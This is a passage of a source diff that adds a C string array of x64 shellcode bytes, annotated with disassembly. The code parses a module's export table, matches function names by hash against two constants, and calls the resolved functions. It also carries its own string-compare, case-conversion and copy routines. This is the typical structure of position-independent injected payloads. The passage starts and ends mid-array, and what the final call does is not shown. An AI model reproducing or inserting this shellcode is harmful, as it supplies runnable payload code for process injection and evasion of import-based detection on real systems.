+    /* 019E */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */
+    /* 01A1 */ &quot;\x48\x89\x84\x24\xc0\x00\x00\x00&quot;                 /* mov [rsp+0xc0], rax                      */
+    /* 01A9 */ &quot;\x48\x8b\x44\x24\x50&quot;                             /* mov rax, [rsp+0x50]                      */
+    /* 01AE */ &quot;\x8b\x40\x1c&quot;                                     /* mov eax, [rax+0x1c]                      */
+    /* 01B1 */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */
+    /* 01B6 */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */
+    /* 01B9 */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */
+    /* 01BC */ &quot;\x48\x89\x84\x24\xa0\x00\x00\x00&quot;                 /* mov [rsp+0xa0], rax                      */
+    /* 01C4 */ &quot;\x48\x8b\x44\x24\x50&quot;                             /* mov rax, [rsp+0x50]                      */
+    /* 01C9 */ &quot;\x8b\x40\x24&quot;                                     /* mov eax, [rax+0x24]                      */
+    /* 01CC */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */
+    /* 01D1 */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */
+    /* 01D4 */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */
+    /* 01D7 */ &quot;\x48\x89\x84\x24\x98\x00\x00\x00&quot;                 /* mov [rsp+0x98], rax                      */
+    /* 01DF */ &quot;\xc7\x44\x24\x74\x88\xef\xff\x6f&quot;                 /* mov dword [rsp+0x74], 0x6fffef88         */
+    /* 01E7 */ &quot;\xc7\x44\x24\x70\x7e\xaa\x8a\x3f&quot;                 /* mov dword [rsp+0x70], 0x3f8aaa7e         */
+    /* 01EF */ &quot;\xc7\x44\x24\x20\x00\x00\x00\x00&quot;                 /* mov dword [rsp+0x20], 0x0                */
+    /* 01F7 */ &quot;\xeb\x0a&quot;                                         /* jmp 0x203                                */
+    /* 01F9 */ &quot;\x8b\x44\x24\x20&quot;                                 /* mov eax, [rsp+0x20]                      */
+    /* 01FD */ &quot;\xff\xc0&quot;                                         /* inc eax                                  */
+    /* 01FF */ &quot;\x89\x44\x24\x20&quot;                                 /* mov [rsp+0x20], eax                      */
+    /* 0203 */ &quot;\x48\x8b\x44\x24\x50&quot;                             /* mov rax, [rsp+0x50]                      */
+    /* 0208 */ &quot;\x8b\x40\x18&quot;                                     /* mov eax, [rax+0x18]                      */
+    /* 020B */ &quot;\x39\x44\x24\x20&quot;                                 /* cmp [rsp+0x20], eax                      */
+    /* 020F */ &quot;\x0f\x83\xf1\x00\x00\x00&quot;                         /* jae 0x306                                */
+    /* 0215 */ &quot;\x8b\x44\x24\x20&quot;                                 /* mov eax, [rsp+0x20]                      */
+    /* 0219 */ &quot;\x48\x8b\x8c\x24\xc0\x00\x00\x00&quot;                 /* mov rcx, [rsp+0xc0]                      */
+    /* 0221 */ &quot;\x8b\x04\x81&quot;                                     /* mov eax, [rcx+rax*4]                     */
+    /* 0224 */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */
+    /* 0229 */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */
+    /* 022C */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */
+    /* 022F */ &quot;\x48\x89\x84\x24\x90\x00\x00\x00&quot;                 /* mov [rsp+0x90], rax                      */
+    /* 0237 */ &quot;\x48\x8b\x8c\x24\x90\x00\x00\x00&quot;                 /* mov rcx, [rsp+0x90]                      */
+    /* 023F */ &quot;\xe8\xac\x03\x00\x00&quot;                             /* call 0x5f0                               */
+    /* 0244 */ &quot;\x3b\x44\x24\x70&quot;                                 /* cmp eax, [rsp+0x70]                      */
+    /* 0248 */ &quot;\x75\x30&quot;                                         /* jnz 0x27a                                */
+    /* 024A */ &quot;\x8b\x44\x24\x20&quot;                                 /* mov eax, [rsp+0x20]                      */
+    /* 024E */ &quot;\x48\x8b\x8c\x24\x98\x00\x00\x00&quot;                 /* mov rcx, [rsp+0x98]                      */
+    /* 0256 */ &quot;\x0f\xb7\x04\x41&quot;                                 /* movzx eax, word [rcx+rax*2]              */
+    /* 025A */ &quot;\x48\x8b\x8c\x24\xa0\x00\x00\x00&quot;                 /* mov rcx, [rsp+0xa0]                      */
+    /* 0262 */ &quot;\x8b\x04\x81&quot;                                     /* mov eax, [rcx+rax*4]                     */
+    /* 0265 */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */
+    /* 026A */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */
+    /* 026D */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */
+    /* 0270 */ &quot;\x48\x89\x84\x24\x80\x00\x00\x00&quot;                 /* mov [rsp+0x80], rax                      */
+    /* 0278 */ &quot;\xeb\x3e&quot;                                         /* jmp 0x2b8                                */
+    /* 027A */ &quot;\x48\x8b\x8c\x24\x90\x00\x00\x00&quot;                 /* mov rcx, [rsp+0x90]                      */
+    /* 0282 */ &quot;\xe8\x69\x03\x00\x00&quot;                             /* call 0x5f0                               */
+    /* 0287 */ &quot;\x3b\x44\x24\x74&quot;                                 /* cmp eax, [rsp+0x74]                      */
+    /* 028B */ &quot;\x75\x2b&quot;                                         /* jnz 0x2b8                                */
+    /* 028D */ &quot;\x8b\x44\x24\x20&quot;                                 /* mov eax, [rsp+0x20]                      */
+    /* 0291 */ &quot;\x48\x8b\x8c\x24\x98\x00\x00\x00&quot;                 /* mov rcx, [rsp+0x98]                      */
+    /* 0299 */ &quot;\x0f\xb7\x04\x41&quot;                                 /* movzx eax, word [rcx+rax*2]              */
+    /* 029D */ &quot;\x48\x8b\x8c\x24\xa0\x00\x00\x00&quot;                 /* mov rcx, [rsp+0xa0]                      */
+    /* 02A5 */ &quot;\x8b\x04\x81&quot;                                     /* mov eax, [rcx+rax*4]                     */
+    /* 02A8 */ &quot;\x48\x8b\x4c\x24\x28&quot;                             /* mov rcx, [rsp+0x28]                      */
+    /* 02AD */ &quot;\x48\x03\xc8&quot;                                     /* add rcx, rax                             */
+    /* 02B0 */ &quot;\x48\x8b\xc1&quot;                                     /* mov rax, rcx                             */
+    /* 02B3 */ &quot;\x48\x89\x44\x24\x78&quot;                             /* mov [rsp+0x78], rax                      */
+    /* 02B8 */ &quot;\x48\x83\xbc\x24\x80\x00\x00\x00\x00&quot;             /* cmp qword [rsp+0x80], 0x0                */
+    /* 02C1 */ &quot;\x74\x3e&quot;                                         /* jz 0x301                                 */
+    /* 02C3 */ &quot;\x48\x83\x7c\x24\x78\x00&quot;                         /* cmp qword [rsp+0x78], 0x0                */
+    /* 02C9 */ &quot;\x74\x36&quot;                                         /* jz 0x301                                 */
+    /* 02CB */ &quot;\x48\x8d\x4c\x24\x58&quot;                             /* lea rcx, [rsp+0x58]                      */
+    /* 02D0 */ &quot;\xff\x54\x24\x78&quot;                                 /* call qword [rsp+0x78]                    */
+    /* 02D4 */ &quot;\x48\x8d\x54\x24\x30&quot;                             /* lea rdx, [rsp+0x30]                      */
+    /* 02D9 */ &quot;\x48\x8b\xc8&quot;                                     /* mov rcx, rax                             */
+    /* 02DC */ &quot;\xff\x94\x24\x80\x00\x00\x00&quot;                     /* call qword [rsp+0x80]                    */
+    /* 02E3 */ &quot;\x48\x89\x84\x24\xa8\x00\x00\x00&quot;                 /* mov [rsp+0xa8], rax                      */
+    /* 02EB */ &quot;\x45\x33\xc9&quot;                                     /* xor r9d, r9d                             */
+    /* 02EE */ &quot;\x45\x33\xc0&quot;                                     /* xor r8d, r8d                             */
+    /* 02F1 */ &quot;\x48\x8d\x54\x24\x40&quot;                             /* lea rdx, [rsp+0x40]                      */
+    /* 02F6 */ &quot;\x33\xc9&quot;                                         /* xor ecx, ecx                             */
+    /* 02F8 */ &quot;\xff\x94\x24\xa8\x00\x00\x00&quot;                     /* call qword [rsp+0xa8]                    */
+    /* 02FF */ &quot;\xeb\x05&quot;                                         /* jmp 0x306                                */
+    /* 0301 */ &quot;\xe9\xf3\xfe\xff\xff&quot;                             /* jmp 0x1f9                                */
+    /* 0306 */ &quot;\x48\x81\xc4\xd8\x00\x00\x00&quot;                     /* add rsp, 0xd8                            */
+    /* 030D */ &quot;\xc3&quot;                                             /* ret                                      */
+    /* 030E */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 030F */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 0310 */ &quot;\x88\x4c\x24\x08&quot;                                 /* mov [rsp+0x8], cl                        */
+    /* 0314 */ &quot;\x48\x83\xec\x18&quot;                                 /* sub rsp, 0x18                            */
+    /* 0318 */ &quot;\x0f\xbe\x44\x24\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */
+    /* 031D */ &quot;\x83\xf8\x41&quot;                                     /* cmp eax, 0x41                            */
+    /* 0320 */ &quot;\x7c\x13&quot;                                         /* jl 0x335                                 */
+    /* 0322 */ &quot;\x0f\xbe\x44\x24\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */
+    /* 0327 */ &quot;\x83\xf8\x5a&quot;                                     /* cmp eax, 0x5a                            */
+    /* 032A */ &quot;\x7f\x09&quot;                                         /* jg 0x335                                 */
+    /* 032C */ &quot;\xc7\x04\x24\x01\x00\x00\x00&quot;                     /* mov dword [rsp], 0x1                     */
+    /* 0333 */ &quot;\xeb\x07&quot;                                         /* jmp 0x33c                                */
+    /* 0335 */ &quot;\xc7\x04\x24\x00\x00\x00\x00&quot;                     /* mov dword [rsp], 0x0                     */
+    /* 033C */ &quot;\x8b\x04\x24&quot;                                     /* mov eax, [rsp]                           */
+    /* 033F */ &quot;\x48\x83\xc4\x18&quot;                                 /* add rsp, 0x18                            */
+    /* 0343 */ &quot;\xc3&quot;                                             /* ret                                      */
+    /* 0344 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 0345 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 0346 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 0347 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 0348 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 0349 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 034A */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 034B */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 034C */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 034D */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 034E */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 034F */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 0350 */ &quot;\x88\x4c\x24\x08&quot;                                 /* mov [rsp+0x8], cl                        */
+    /* 0354 */ &quot;\x48\x83\xec\x38&quot;                                 /* sub rsp, 0x38                            */
+    /* 0358 */ &quot;\x0f\xb6\x4c\x24\x40&quot;                             /* movzx ecx, byte [rsp+0x40]               */
+    /* 035D */ &quot;\xe8\xae\xff\xff\xff&quot;                             /* call 0x310                               */
+    /* 0362 */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */
+    /* 0364 */ &quot;\x74\x0e&quot;                                         /* jz 0x374                                 */
+    /* 0366 */ &quot;\x0f\xbe\x44\x24\x40&quot;                             /* movsx eax, byte [rsp+0x40]               */
+    /* 036B */ &quot;\x83\xc0\x20&quot;                                     /* add eax, 0x20                            */
+    /* 036E */ &quot;\x89\x44\x24\x20&quot;                                 /* mov [rsp+0x20], eax                      */
+    /* 0372 */ &quot;\xeb\x09&quot;                                         /* jmp 0x37d                                */
+    /* 0374 */ &quot;\x0f\xbe\x44\x24\x40&quot;                             /* movsx eax, byte [rsp+0x40]               */
+    /* 0379 */ &quot;\x89\x44\x24\x20&quot;                                 /* mov [rsp+0x20], eax                      */
+    /* 037D */ &quot;\x0f\xb6\x44\x24\x20&quot;                             /* movzx eax, byte [rsp+0x20]               */
+    /* 0382 */ &quot;\x48\x83\xc4\x38&quot;                                 /* add rsp, 0x38                            */
+    /* 0386 */ &quot;\xc3&quot;                                             /* ret                                      */
+    /* 0387 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 0388 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 0389 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 038A */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 038B */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 038C */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 038D */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 038E */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 038F */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 0390 */ &quot;\x48\x89\x4c\x24\x08&quot;                             /* mov [rsp+0x8], rcx                       */
+    /* 0395 */ &quot;\x48\x83\xec\x18&quot;                                 /* sub rsp, 0x18                            */
+    /* 0399 */ &quot;\xc7\x04\x24\x00\x00\x00\x00&quot;                     /* mov dword [rsp], 0x0                     */
+    /* 03A0 */ &quot;\x8b\x04\x24&quot;                                     /* mov eax, [rsp]                           */
+    /* 03A3 */ &quot;\x48\x8b\x4c\x24\x20&quot;                             /* mov rcx, [rsp+0x20]                      */
+    /* 03A8 */ &quot;\x0f\xb7\x04\x41&quot;                                 /* movzx eax, word [rcx+rax*2]              */
+    /* 03AC */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */
+    /* 03AE */ &quot;\x74\x0a&quot;                                         /* jz 0x3ba                                 */
+    /* 03B0 */ &quot;\x8b\x04\x24&quot;                                     /* mov eax, [rsp]                           */
+    /* 03B3 */ &quot;\xff\xc0&quot;                                         /* inc eax                                  */
+    /* 03B5 */ &quot;\x89\x04\x24&quot;                                     /* mov [rsp], eax                           */
+    /* 03B8 */ &quot;\xeb\xe6&quot;                                         /* jmp 0x3a0                                */
+    /* 03BA */ &quot;\x8b\x04\x24&quot;                                     /* mov eax, [rsp]                           */
+    /* 03BD */ &quot;\x48\x83\xc4\x18&quot;                                 /* add rsp, 0x18                            */
+    /* 03C1 */ &quot;\xc3&quot;                                             /* ret                                      */
+    /* 03C2 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03C3 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03C4 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03C5 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03C6 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03C7 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03C8 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03C9 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03CA */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03CB */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03CC */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03CD */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03CE */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03CF */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 03D0 */ &quot;\x48\x89\x54\x24\x10&quot;                             /* mov [rsp+0x10], rdx                      */
+    /* 03D5 */ &quot;\x48\x89\x4c\x24\x08&quot;                             /* mov [rsp+0x8], rcx                       */
+    /* 03DA */ &quot;\x48\x83\xec\x38&quot;                                 /* sub rsp, 0x38                            */
+    /* 03DE */ &quot;\xb8\x01\x00\x00\x00&quot;                             /* mov eax, 0x1                             */
+    /* 03E3 */ &quot;\x48\x6b\xc0\x00&quot;                                 /* imul rax, rax, 0x0                       */
+    /* 03E7 */ &quot;\x48\x8b\x4c\x24\x48&quot;                             /* mov rcx, [rsp+0x48]                      */
+    /* 03EC */ &quot;\x0f\xb6\x04\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */
+    /* 03F0 */ &quot;\x88\x44\x24\x22&quot;                                 /* mov [rsp+0x22], al                       */
+    /* 03F4 */ &quot;\x0f\xb6\x4c\x24\x22&quot;                             /* movzx ecx, byte [rsp+0x22]               */
+    /* 03F9 */ &quot;\xe8\x52\xff\xff\xff&quot;                             /* call 0x350                               */
+    /* 03FE */ &quot;\x88\x44\x24\x21&quot;                                 /* mov [rsp+0x21], al                       */
+    /* 0402 */ &quot;\x48\x8b\x44\x24\x48&quot;                             /* mov rax, [rsp+0x48]                      */
+    /* 0407 */ &quot;\x48\x83\xc0\x02&quot;                                 /* add rax, 0x2                             */
+    /* 040B */ &quot;\x48\x89\x44\x24\x48&quot;                             /* mov [rsp+0x48], rax                      */
+    /* 0410 */ &quot;\x0f\xbe\x44\x24\x21&quot;                             /* movsx eax, byte [rsp+0x21]               */
+    /* 0415 */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */
+    /* 0417 */ &quot;\x75\x07&quot;                                         /* jnz 0x420                                */
+    /* 0419 */ &quot;\x48\x8b\x44\x24\x40&quot;                             /* mov rax, [rsp+0x40]                      */
+    /* 041E */ &quot;\xeb\x7c&quot;                                         /* jmp 0x49c                                */
+    /* 0420 */ &quot;\x48\x8b\x4c\x24\x48&quot;                             /* mov rcx, [rsp+0x48]                      */
+    /* 0425 */ &quot;\xe8\x66\xff\xff\xff&quot;                             /* call 0x390                               */
+    /* 042A */ &quot;\x89\x44\x24\x24&quot;                                 /* mov [rsp+0x24], eax                      */
+    /* 042E */ &quot;\xb8\x01\x00\x00\x00&quot;                             /* mov eax, 0x1                             */
+    /* 0433 */ &quot;\x48\x6b\xc0\x00&quot;                                 /* imul rax, rax, 0x0                       */
+    /* 0437 */ &quot;\x48\x8b\x4c\x24\x40&quot;                             /* mov rcx, [rsp+0x40]                      */
+    /* 043C */ &quot;\x0f\xb6\x04\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */
+    /* 0440 */ &quot;\x88\x44\x24\x23&quot;                                 /* mov [rsp+0x23], al                       */
+    /* 0444 */ &quot;\x0f\xb6\x4c\x24\x23&quot;                             /* movzx ecx, byte [rsp+0x23]               */
+    /* 0449 */ &quot;\xe8\x02\xff\xff\xff&quot;                             /* call 0x350                               */
+    /* 044E */ &quot;\x88\x44\x24\x20&quot;                                 /* mov [rsp+0x20], al                       */
+    /* 0452 */ &quot;\x48\x8b\x44\x24\x40&quot;                             /* mov rax, [rsp+0x40]                      */
+    /* 0457 */ &quot;\x48\x83\xc0\x02&quot;                                 /* add rax, 0x2                             */
+    /* 045B */ &quot;\x48\x89\x44\x24\x40&quot;                             /* mov [rsp+0x40], rax                      */
+    /* 0460 */ &quot;\x0f\xbe\x44\x24\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */
+    /* 0465 */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */
+    /* 0467 */ &quot;\x75\x04&quot;                                         /* jnz 0x46d                                */
+    /* 0469 */ &quot;\x33\xc0&quot;                                         /* xor eax, eax                             */
+    /* 046B */ &quot;\xeb\x2f&quot;                                         /* jmp 0x49c                                */
+    /* 046D */ &quot;\x0f\xbe\x44\x24\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */
+    /* 0472 */ &quot;\x0f\xbe\x4c\x24\x21&quot;                             /* movsx ecx, byte [rsp+0x21]               */
+    /* 0477 */ &quot;\x3b\xc1&quot;                                         /* cmp eax, ecx                             */
+    /* 0479 */ &quot;\x75\xb3&quot;                                         /* jnz 0x42e                                */
+    /* 047B */ &quot;\x44\x8b\x44\x24\x24&quot;                             /* mov r8d, [rsp+0x24]                      */
+    /* 0480 */ &quot;\x48\x8b\x54\x24\x48&quot;                             /* mov rdx, [rsp+0x48]                      */
+    /* 0485 */ &quot;\x48\x8b\x4c\x24\x40&quot;                             /* mov rcx, [rsp+0x40]                      */
+    /* 048A */ &quot;\xe8\x21\x00\x00\x00&quot;                             /* call 0x4b0                               */
+    /* 048F */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */
+    /* 0491 */ &quot;\x75\x9b&quot;                                         /* jnz 0x42e                                */
+    /* 0493 */ &quot;\x48\x8b\x44\x24\x40&quot;                             /* mov rax, [rsp+0x40]                      */
+    /* 0498 */ &quot;\x48\x83\xe8\x02&quot;                                 /* sub rax, 0x2                             */
+    /* 049C */ &quot;\x48\x83\xc4\x38&quot;                                 /* add rsp, 0x38                            */
+    /* 04A0 */ &quot;\xc3&quot;                                             /* ret                                      */
+    /* 04A1 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04A2 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04A3 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04A4 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04A5 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04A6 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04A7 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04A8 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04A9 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04AA */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04AB */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04AC */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04AD */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04AE */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04AF */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 04B0 */ &quot;\x44\x89\x44\x24\x18&quot;                             /* mov [rsp+0x18], r8d                      */
+    /* 04B5 */ &quot;\x48\x89\x54\x24\x10&quot;                             /* mov [rsp+0x10], rdx                      */
+    /* 04BA */ &quot;\x48\x89\x4c\x24\x08&quot;                             /* mov [rsp+0x8], rcx                       */
+    /* 04BF */ &quot;\x48\x83\xec\x38&quot;                                 /* sub rsp, 0x38                            */
+    /* 04C3 */ &quot;\x8b\x44\x24\x50&quot;                                 /* mov eax, [rsp+0x50]                      */
+    /* 04C7 */ &quot;\xff\xc8&quot;                                         /* dec eax                                  */
+    /* 04C9 */ &quot;\x89\x44\x24\x50&quot;                                 /* mov [rsp+0x50], eax                      */
+    /* 04CD */ &quot;\xb8\x01\x00\x00\x00&quot;                             /* mov eax, 0x1                             */
+    /* 04D2 */ &quot;\x48\x6b\xc0\x00&quot;                                 /* imul rax, rax, 0x0                       */
+    /* 04D6 */ &quot;\x48\x8b\x4c\x24\x40&quot;                             /* mov rcx, [rsp+0x40]                      */
+    /* 04DB */ &quot;\x0f\xb6\x04\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */
+    /* 04DF */ &quot;\x88\x44\x24\x20&quot;                                 /* mov [rsp+0x20], al                       */
+    /* 04E3 */ &quot;\x48\x8b\x44\x24\x40&quot;                             /* mov rax, [rsp+0x40]                      */
+    /* 04E8 */ &quot;\x48\x83\xc0\x02&quot;                                 /* add rax, 0x2                             */
+    /* 04EC */ &quot;\x48\x89\x44\x24\x40&quot;                             /* mov [rsp+0x40], rax                      */
+    /* 04F1 */ &quot;\xb8\x01\x00\x00\x00&quot;                             /* mov eax, 0x1                             */
+    /* 04F6 */ &quot;\x48\x6b\xc0\x00&quot;                                 /* imul rax, rax, 0x0                       */
+    /* 04FA */ &quot;\x48\x8b\x4c\x24\x48&quot;                             /* mov rcx, [rsp+0x48]                      */
+    /* 04FF */ &quot;\x0f\xb6\x04\x01&quot;                                 /* movzx eax, byte [rcx+rax]                */
+    /* 0503 */ &quot;\x88\x44\x24\x21&quot;                                 /* mov [rsp+0x21], al                       */
+    /* 0507 */ &quot;\x48\x8b\x44\x24\x48&quot;                             /* mov rax, [rsp+0x48]                      */
+    /* 050C */ &quot;\x48\x83\xc0\x02&quot;                                 /* add rax, 0x2                             */
+    /* 0510 */ &quot;\x48\x89\x44\x24\x48&quot;                             /* mov [rsp+0x48], rax                      */
+    /* 0515 */ &quot;\x0f\xb6\x4c\x24\x20&quot;                             /* movzx ecx, byte [rsp+0x20]               */
+    /* 051A */ &quot;\xe8\x31\xfe\xff\xff&quot;                             /* call 0x350                               */
+    /* 051F */ &quot;\x0f\xbe\xc0&quot;                                     /* movsx eax, al                            */
+    /* 0522 */ &quot;\x89\x44\x24\x28&quot;                                 /* mov [rsp+0x28], eax                      */
+    /* 0526 */ &quot;\x0f\xb6\x4c\x24\x21&quot;                             /* movzx ecx, byte [rsp+0x21]               */
+    /* 052B */ &quot;\xe8\x20\xfe\xff\xff&quot;                             /* call 0x350                               */
+    /* 0530 */ &quot;\x0f\xbe\xc0&quot;                                     /* movsx eax, al                            */
+    /* 0533 */ &quot;\x8b\x4c\x24\x28&quot;                                 /* mov ecx, [rsp+0x28]                      */
+    /* 0537 */ &quot;\x2b\xc8&quot;                                         /* sub ecx, eax                             */
+    /* 0539 */ &quot;\x8b\xc1&quot;                                         /* mov eax, ecx                             */
+    /* 053B */ &quot;\x89\x44\x24\x24&quot;                                 /* mov [rsp+0x24], eax                      */
+    /* 053F */ &quot;\x83\x7c\x24\x24\x00&quot;                             /* cmp dword [rsp+0x24], 0x0                */
+    /* 0544 */ &quot;\x75\x1d&quot;                                         /* jnz 0x563                                */
+    /* 0546 */ &quot;\x0f\xbe\x44\x24\x20&quot;                             /* movsx eax, byte [rsp+0x20]               */
+    /* 054B */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */
+    /* 054D */ &quot;\x74\x14&quot;                                         /* jz 0x563                                 */
+    /* 054F */ &quot;\x0f\xbe\x44\x24\x21&quot;                             /* movsx eax, byte [rsp+0x21]               */
+    /* 0554 */ &quot;\x85\xc0&quot;                                         /* test eax, eax                            */
+    /* 0556 */ &quot;\x74\x0b&quot;                                         /* jz 0x563                                 */
+    /* 0558 */ &quot;\x83\x7c\x24\x50\x00&quot;                             /* cmp dword [rsp+0x50], 0x0                */
+    /* 055D */ &quot;\x0f\x87\x60\xff\xff\xff&quot;                         /* ja 0x4c3                                 */
+    /* 0563 */ &quot;\x8b\x44\x24\x24&quot;                                 /* mov eax, [rsp+0x24]                      */
+    /* 0567 */ &quot;\x48\x83\xc4\x38&quot;                                 /* add rsp, 0x38                            */
+    /* 056B */ &quot;\xc3&quot;                                             /* ret                                      */
+    /* 056C */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 056D */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 056E */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 056F */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 0570 */ &quot;\x44\x89\x44\x24\x18&quot;                             /* mov [rsp+0x18], r8d                      */
+    /* 0575 */ &quot;\x48\x89\x54\x24\x10&quot;                             /* mov [rsp+0x10], rdx                      */
+    /* 057A */ &quot;\x48\x89\x4c\x24\x08&quot;                             /* mov [rsp+0x8], rcx                       */
+    /* 057F */ &quot;\x48\x83\xec\x28&quot;                                 /* sub rsp, 0x28                            */
+    /* 0583 */ &quot;\x48\x8b\x44\x24\x38&quot;                             /* mov rax, [rsp+0x38]                      */
+    /* 0588 */ &quot;\x48\x89\x44\x24\x10&quot;                             /* mov [rsp+0x10], rax                      */
+    /* 058D */ &quot;\x48\x8b\x44\x24\x30&quot;                             /* mov rax, [rsp+0x30]                      */
+    /* 0592 */ &quot;\x48\x89\x44\x24\x08&quot;                             /* mov [rsp+0x8], rax                       */
+    /* 0597 */ &quot;\x8b\x44\x24\x40&quot;                                 /* mov eax, [rsp+0x40]                      */
+    /* 059B */ &quot;\x89\x04\x24&quot;                                     /* mov [rsp], eax                           */
+    /* 059E */ &quot;\x8b\x44\x24\x40&quot;                                 /* mov eax, [rsp+0x40]                      */
+    /* 05A2 */ &quot;\xff\xc8&quot;                                         /* dec eax                                  */
+    /* 05A4 */ &quot;\x89\x44\x24\x40&quot;                                 /* mov [rsp+0x40], eax                      */
+    /* 05A8 */ &quot;\x83\x3c\x24\x00&quot;                                 /* cmp dword [rsp], 0x0                     */
+    /* 05AC */ &quot;\x74\x2b&quot;                                         /* jz 0x5d9                                 */
+    /* 05AE */ &quot;\x48\x8b\x44\x24\x08&quot;                             /* mov rax, [rsp+0x8]                       */
+    /* 05B3 */ &quot;\x48\x8b\x4c\x24\x10&quot;                             /* mov rcx, [rsp+0x10]                      */
+    /* 05B8 */ &quot;\x0f\xb6\x09&quot;                                     /* movzx ecx, byte [rcx]                    */
+    /* 05BB */ &quot;\x88\x08&quot;                                         /* mov [rax], cl                            */
+    /* 05BD */ &quot;\x48\x8b\x44\x24\x08&quot;                             /* mov rax, [rsp+0x8]                       */
+    /* 05C2 */ &quot;\x48\xff\xc0&quot;                                     /* inc rax                                  */
+    /* 05C5 */ &quot;\x48\x89\x44\x24\x08&quot;                             /* mov [rsp+0x8], rax                       */
+    /* 05CA */ &quot;\x48\x8b\x44\x24\x10&quot;                             /* mov rax, [rsp+0x10]                      */
+    /* 05CF */ &quot;\x48\xff\xc0&quot;                                     /* inc rax                                  */
+    /* 05D2 */ &quot;\x48\x89\x44\x24\x10&quot;                             /* mov [rsp+0x10], rax                      */
+    /* 05D7 */ &quot;\xeb\xbe&quot;                                         /* jmp 0x597                                */
+    /* 05D9 */ &quot;\x48\x8b\x44\x24\x30&quot;                             /* mov rax, [rsp+0x30]                      */
+    /* 05DE */ &quot;\x48\x83\xc4\x28&quot;                                 /* add rsp, 0x28                            */
+    /* 05E2 */ &quot;\xc3&quot;                                             /* ret                                      */
+    /* 05E3 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 05E4 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 05E5 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 05E6 */ &quot;\xcc&quot;                                             /* int3                                     */
+    /* 05E7 */ &quot;\xcc&quot;                                             /* int3                                     */
